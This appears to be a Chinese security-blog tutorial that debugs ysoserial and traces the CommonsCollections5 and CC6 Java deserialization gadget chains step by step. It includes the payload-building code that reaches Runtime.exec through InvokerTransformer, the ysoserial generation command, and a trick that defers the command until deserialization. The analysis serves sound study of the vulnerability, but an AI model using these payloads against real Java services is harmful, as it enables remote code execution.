## ysoserial简介

ysoserial是一款用于生成利用不安全的Java
对象反序列化的有效负载的概念验证工具，下载地址如下：<https://github.com/frohoff/ysoserial>，一般使用方法为：  
`java -jar ysoserial-x.x.x-SNAPSHOT-all.jar payload command >ser文件名`

## idea调试ysoserial

这个也比较简单，打开idea，将ysoserial下载下来之后将其作为项目打开。找到`GeneratePayload.java`，这里就是ysoserial的main方法。在运行一次之后idea的右上角会出现他的运行配置，我们在程序实参的部分添加我们所要执行的payload和命令，如下：  
![image.png](https://image.3001.net/images/20220831/1661946495_630f4a7fcc330b6ebe3a9.png!small)  
这里我们调试使用的jdk版本为1.8.0_311。

## cc5

### 调试前的准备

在调试之前，我们先将idea的payload参数改为cc5和计算器，即`CommonsCollections5
"/System/Applications/Calculator.app/Contents/MacOS/Calculator"`。  
再在payloads文件夹下找到对应的payload，也就是cc5的payload，我这里就直接贴代码了：

    
    
    public BadAttributeValueExpException getObject(final String command) throws Exception {
    		final String[] execArgs = new String[] { command };
    		// inert chain for setup
    		final Transformer transformerChain = new ChainedTransformer(
    		        new Transformer[]{ new ConstantTransformer(1) });
    		// real chain for after setup
    		final Transformer[] transformers = new Transformer[] {
    				new ConstantTransformer(Runtime.class),
    				new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
    				new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
    				new InvokerTransformer("exec",
    					new Class[] { String.class }, execArgs),
    				new ConstantTransformer(1) };
    
    		final Map innerMap = new HashMap();
    
    		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
    
    		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
    
    		BadAttributeValueExpException val = new BadAttributeValueExpException(null);
    		Field valfield = val.getClass().getDeclaredField("val");
            Reflections.setAccessible(valfield);
    		valfield.set(val, entry);
    
    		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
    
    		return val;
    	}
    

我在阅读其他分析文章的时候，发现了这么几种分析方法：一种是从漏洞点直接开始从里向外分析的，还有一种是从反序列化的入口开始从外向里分析的。根据个人习惯，我将从入口点一步一步开始分析。

### BadAttributeValueExpException

由于payload返回的是`val`，而`val`是`BadAttributeValueExpException`类，所以入口点一定在该类的readObject方法中。
**入口点一定在返回类的readObject方法中**  
我们按住ctrl，点击进入该类，利用ctrl+f找到`readObject`方法。  
我们可以看到，86行，有这么一句：  
`val = valObj.toString();`  
咱们回到payload，里面有这么一句：

    
    
    Field valfield = val.getClass().getDeclaredField("val");
    Reflections.setAccessible(valfield);
    valfield.set(val, entry);
    

payload中，该句是利用Field对`val`变量进行赋值利用ctrl和左键，我们可以知道，`val`在50行被定义，
**是private类型的Object类**
。而它的值被设置成了`entry`变量。（这里使用了`setAccessible`方法使其能够修改private变量的值，熟悉反射的师傅应该能够一眼看出来。）

好的，回到`valObj.toString();`，由于刚刚的field对其赋值，以及readObject中的`Object valObj =
gf.get("val", null);`，所以`valObj`的值为entry。而entry在payload中是这样声明的  
`TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");`，是一个TiedMapEntry类。  
所以`valObj.toString()`其实就是`TiedMapEntry.toString`。我们接着跟入。  
![image.png](https://image.3001.net/images/20220831/1661951104_630f5c80541d43265b417.png!small)

### TiedMapEntry

`toString`方法中调用了两个方法，分别是getKey和getValue。getKey没什么东西就不看了，来看getValue。  
`getValue`中只有一句`return
map.get(key);`那么这里的map和key是什么呢？看到entry的声明便知道map是`lazyMap`，key是`"foo"`，也就是`return
lazyMap.get("foo");`，继续跟进。  
![image.png](https://image.3001.net/images/20220831/1661951155_630f5cb393bfcafbef1c7.png!small)  
![image.png](https://image.3001.net/images/20220831/1661951174_630f5cc6825ddeff43614.png!small)

### LazyMap

来到148行

    
    
    public Object get(Object key) {
        // create value for key if key is not currently in the map
        if (map.containsKey(key) == false) {
            Object value = factory.transform(key);
            map.put(key, value);
            return value;
        }
        return map.get(key);
    }
    

接下来就比较关键了。  
首先是`map.containsKey(key) == false`，map的值是什么（key的值我们知道是刚刚传进来的`"foo"`）。  
我们看到payload中，`final Map lazyMap = LazyMap.decorate(innerMap,
transformerChain);`  
86行decorate方法如下：

    
    
    public static Map decorate(Map map, Transformer factory) {
            return new LazyMap(map, factory);
        }
    

也就是说map为`innermap`，与此同时下面的`factory`为`transformerChain`。  
然后是如何进入if语句中，查阅[菜鸟教程](https://www.runoob.com/java/java-hashmap-containskey.html)后发现`containsKey`方法的作用为:如果 hashMap 中存在指定的 key 对应的映射关系返回
true，否则返回 false。  
而我们的innermap声明的是一个空的hashMap，很显然不存在映射关系，成功进入if。  
加上刚刚说了factory为`transformerChain`，也就是`ChainedTransformer.transform`，继续跟进

### ChainedTransformer

来到120行，方法具体实现如下：

    
    
    public Object transform(Object object) {
            for (int i = 0; i < iTransformers.length; i++) {
                object = iTransformers[i].transform(object);
            }
            return object;
        }
    

粗略的来说，就是将前一个对象的值作为后一个对象的输入，对于payload构造的transformers，拼接之后是这样的：

    
    
    Object obj = Runtime.class.getMethod("getRuntime").invoke(Runtime.class); obj.getClass().getMethod("exec",String.class).invoke(obj,"/System/Applications/Calculator.app/Contents/MacOS/Calculator");
    

### InvokerTransformer

![image.png](https://image.3001.net/images/20220831/1661951509_630f5e1574b8d68567806.png!small)  
到最后，iTransformers是InvokerTransformer，进入`InvokerTransformer.transform`，125行`return
method.invoke(input, iArgs);`。成功执行，至此，cc5的反序列化过程全部分析完毕。

### 序列化时不执行命令

这个其实也是我看其他师傅的文章学到的，其实很简单，先给他一个错误的类，然后利用反射修改过来即可  
首先实例化一个fake transform:`Transformer[] faketransform = new Transformer[]{new
ConstantTransformer(1)};`  
然后将其赋值`ChainedTransformer chainedTransformer = new
ChainedTransformer(faketransform);`  
再然后利用反射对它进行修改

    
    
    Field fchain = chainedTransformer.getClass().getDeclaredField("iTransformers");
    fchain.setAccessible(true);
    fchain.set(chainedTransformer, transformers);
    

### 小结

总结一下，链子是这样的：

    
    
    BadAttributeValueExpException#readObject -> TiedMapEntry#toString -> LazyMap#get -> ChainedTransformer#transform -> InvokerTransformer#transform
    

从入口点开始分析的话，好处就在于可以通过payload熟练掌握具体的链子的触发方法，从而更加熟悉链子的组成，缺点就是有时候很难知道某些值是什么样子的，基本全靠脑补，加上某些链子较为复杂，入口点很难找到，容易找错入口点然后直接寄，所以一般用以分析payload。  
接下来分析它的兄弟链cc6。

## cc6

上面由于比较简单，所以cc5我直接没有用idea进行调试，有需要的师傅可以打上断点进行调试。cc6的反序列化过程和cc5其实差不多，因此被称之为兄弟链，但ysoserial中的cc6链构造和值的传递却是十分的有意思。

### 简单过一下cc6

return一个HashSet类，说明肯定是`HashSet类的readObject方法`，直接看最下面，`map.put`。  
![image.png](https://image.3001.net/images/20220831/1661952819_630f63336f06783d9ef66.png!small)  
上面的

    
    
    map = (((HashSet<?>)this) instanceof LinkedHashSet ?
                   new LinkedHashMap<E,Object>(capacity, loadFactor) :
                   new HashMap<E,Object>(capacity, loadFactor));
    

我们可以知道map为hashmap（查instanceof的用法即可知道为什么）  
跟进hashmap.put，`return putVal(hash(key), key, value, false, true);`  
![image.png](https://image.3001.net/images/20220901/1662017544_6310600843b6f9fee0059.png!small)  
跟进hash(key)，`return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);`  
![image.png](https://image.3001.net/images/20220901/1662017570_63106022865e7fb1df64f.png!small)  
 **这里的key是entry** ，跟进`TiedMapEntry.hashcode`，`Object value = getValue();`，  
![image.png](https://image.3001.net/images/20220901/1662017610_6310604ab71f8aea14b89.png!small)  
跟进getValue，`return map.get(key);`  
![image.png](https://image.3001.net/images/20220901/1662017631_6310605f431279bc63c7a.png!small)  
到这里，已经和cc5是一样的了，不用再跟下去了。  
也就是说，cc6的链子为

    
    
    HashSet#readObject -> HashMap#put -> TiedMapEntry#hashcode -> LazyMap#get -> ChainedTransformer#transform -> InvokerTransformer#transform
    

那么，问题来了，ysoserial中的payload是如何将entry和hashset联系起来的呢？

### ysoserial的属性传递

很显然它的属性传递是通过Field进行的。  
先把代码贴上

    
    
    Field f = null;
            try {
                f = HashSet.class.getDeclaredField("map");
            } catch (NoSuchFieldException e) {
                f = HashSet.class.getDeclaredField("backingMap");
            }
    
            Reflections.setAccessible(f);
            HashMap innimpl = (HashMap) f.get(map);
    
            Field f2 = null;
            try {
                f2 = HashMap.class.getDeclaredField("table");
            } catch (NoSuchFieldException e) {
                f2 = HashMap.class.getDeclaredField("elementData");
            }
    
            Reflections.setAccessible(f2);
            Object[] array = (Object[]) f2.get(innimpl);
    
            Object node = array[0];
            if (node == null) {
                node = array[1];
            }
    
            Field keyField = null;
            try {
                keyField = node.getClass().getDeclaredField("key");
            } catch (Exception e) {
                keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
            }
    
            Reflections.setAccessible(keyField);
            keyField.set(node, entry);
    

从最开始看起  
`f =
HashSet.class.getDeclaredField("map");`，通过ctrl+左键我们可以知道，HashSet中的变量map，其实是一个HashMap  
![image.png](https://image.3001.net/images/20220831/1661953679_630f668f46ddda8fdc91a.png!small)  
`HashMap innimpl = (HashMap)
f.get(map);`将map变量的属性（这里是在payload中定义的HashSet类的变量，与HashSet类中定义的map变量不同）传给了HashMap类的innimpl，此时innimpl为`"foo"->空`（没有字段的对象实例化后的结果就是图中的样子）  
![image.png](https://image.3001.net/images/20220831/1661954061_630f680d2b526653331f7.png!small)  
而`f2 = HashMap.class.getDeclaredField("table");`，我们可以知道，变量table其实是一个Node  
![image.png](https://image.3001.net/images/20220831/1661954145_630f6861f28e142e95123.png!small)  
`Object[] array = (Object[]) f2.get(innimpl);`则此时array为`"foo"->空`，  
![image.png](https://image.3001.net/images/20220901/1662016252_63105afc0102c340a77c8.png!small)  
而node无论如何都会获取到array的键值，因此，node也为`"foo"->空`  
![image.png](https://image.3001.net/images/20220901/1662016299_63105b2b459f42c9b0f8f.png!small)  
最后，`keyField =
node.getClass().getDeclaredField("key");`，此时keyField所代表的，是node的`key`，也就是`键`。由于没有具体的声明变量，所以利用ctrl+左键是看不到的，只能靠调试才能看到  
![image.png](https://image.3001.net/images/20220901/1662016473_63105bd974c24eb8d2a08.png!small)  
经过`keyField.set(node,
entry);`，将entry传递给了node的key，也就是node的键的属性变成了TiedMapEntry，如同。  
![image.png](https://image.3001.net/images/20220901/1662016558_63105c2e16ccdd6602791.png!small)  
至此，成功将entry和HashSet联系起来从而形成了链子。

第一次写文章，如果有哪里写的有问题，还希望大佬们多多指点

